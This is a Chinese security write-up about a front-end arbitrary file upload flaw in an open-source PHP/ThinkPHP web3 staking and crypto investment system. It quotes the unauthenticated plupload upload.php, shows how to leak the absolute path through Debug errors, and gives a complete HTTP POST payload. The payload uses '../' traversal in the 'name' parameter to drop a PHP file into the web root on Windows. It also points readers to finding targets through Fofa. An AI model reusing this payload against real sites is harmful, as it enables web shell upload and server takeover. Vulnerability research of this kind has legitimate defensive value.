## **前言** 





**一款基于PHP开发的开源web3质押挖矿理财系统源码，支持USDT等主流虚拟币的管理与投资功能。源码兼容BSC生态，前端采用UNIAPP框架，后端ThinkPHP**

**Fofa指纹 : 自己找!**

### ![图片](%E6%9F%90BSC%E9%93%BEWeb3%E8%B4%A8%E6%8A%BC%E6%8C%96%E7%9F%BF%E7%90%86%E8%B4%A2%E7%B3%BB%E7%BB%9F.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/640.jpeg)

### **框架:ThinkPHP 5.1.41 Debug:True**

## **0x01 前台任意文件上传漏洞(Win环境)** 



**位于 /static/admin/plugins/plupload/examples/upload.php 中存在fopen函数，且$_FILES["file"]和$filename传入参数可控，并未有鉴权，导致前台任意文件上传**

```
<?php
// Make sure file is not cached (as it happens for example on iOS devices)
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$maxFileAge = 5 * 3600; // Temp file age in seconds


// Create target dir
if (!file_exists($targetDir)) {
 @mkdir($targetDir);
}

// Get a file name
if (isset($_REQUEST["name"])) {
 $fileName = $_REQUEST["name"];
} elseif (!empty($_FILES)) {
 $fileName = $_FILES["file"]["name"];
} else {
 $fileName = uniqid("file_");
}

$filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName;

// Chunking might be enabled
$chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0;
$chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0;


// Remove old temp files 
if ($cleanupTargetDir) {
if (!is_dir($targetDir) || !$dir = opendir($targetDir)) {
die('{"jsonrpc" : "2.0", "error" : {"code": 100, "message": "Failed to open temp directory."}, "id" : "id"}');
 }

while (($file = readdir($dir)) !== false) {
  $tmpfilePath = $targetDir . DIRECTORY_SEPARATOR . $file;

// If temp file is current file proceed to the next
if ($tmpfilePath == "{$filePath}.part") {
   continue;
  }

// Remove temp file if it is older than the max age and is not the current file
if (preg_match('/\.part$/', $file) && (filemtime($tmpfilePath) < time() - $maxFileAge)) {
   @unlink($tmpfilePath);
  }
 }
 closedir($dir);
} 


// Open temp file
if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}');
}

if (!empty($_FILES)) {
if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) {
die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}, "id" : "id"}');
 }

// Read binary input stream and append it to temp file
if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) {
die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}');
 }
} else { 
if (!$in = @fopen("php://input", "rb")) {
die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}');
 }
}

while ($buff = fread($in, 4096)) {
 fwrite($out, $buff);
}

@fclose($out);
@fclose($in);

// Check if file has been uploaded
if (!$chunks || $chunk == $chunks - 1) {
// Strip the temp .part suffix off 
 rename("{$filePath}.part", $filePath);
}

// Return Success JSON-RPC response
die('{"jsonrpc" : "2.0", "result" : null, "id" : "id"}');
```



**这里设置了上传路径为 $filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName;**

**
**

**其中$targetDir变量为读取php.ini文件的upload_tmp_dir参数为路径，但一般php.ini默认会注释掉这一条，这就导致了上传路径实际会回到该系统盘的根目录去创建一个文件夹 plugload.**

**![图片](%E6%9F%90BSC%E9%93%BEWeb3%E8%B4%A8%E6%8A%BC%E6%8C%96%E7%9F%BF%E7%90%86%E8%B4%A2%E7%B3%BB%E7%BB%9F.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/640-1751854876169-1.jpeg)**



**而$fileName变量为我们可控的$_REQUEST["name"]传入，而绝对路径直接随便 /index.php/xxx 即可报错，默认是开了Debug的.**

![image.png](%E6%9F%90BSC%E9%93%BEWeb3%E8%B4%A8%E6%8A%BC%E6%8C%96%E7%9F%BF%E7%90%86%E8%B4%A2%E7%B3%BB%E7%BB%9F.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/640-1751854876169-2.jpeg)



**得到绝对路径之后，使用../回到根目录后直接拼接后边到public目录即可上传文件.**

**Payload (****仅Windows下可用****):**

```
POST /static/admin/plugins/plupload/examples/upload.php?name=../phpstudy_pro/WWW/public/fw.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOwlYatAz8CMOA8ps
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

![image.png](%E6%9F%90BSC%E9%93%BEWeb3%E8%B4%A8%E6%8A%BC%E6%8C%96%E7%9F%BF%E7%90%86%E8%B4%A2%E7%B3%BB%E7%BB%9F.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/640-1751854876169-3.jpeg)![image.png](%E6%9F%90BSC%E9%93%BEWeb3%E8%B4%A8%E6%8A%BC%E6%8C%96%E7%9F%BF%E7%90%86%E8%B4%A2%E7%B3%BB%E7%BB%9F.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/640-1751854876169-4.jpeg)



**如果在Linux环境下，会被直接die()回去，且因为$targetDir变量被固定死，所以无法绕过**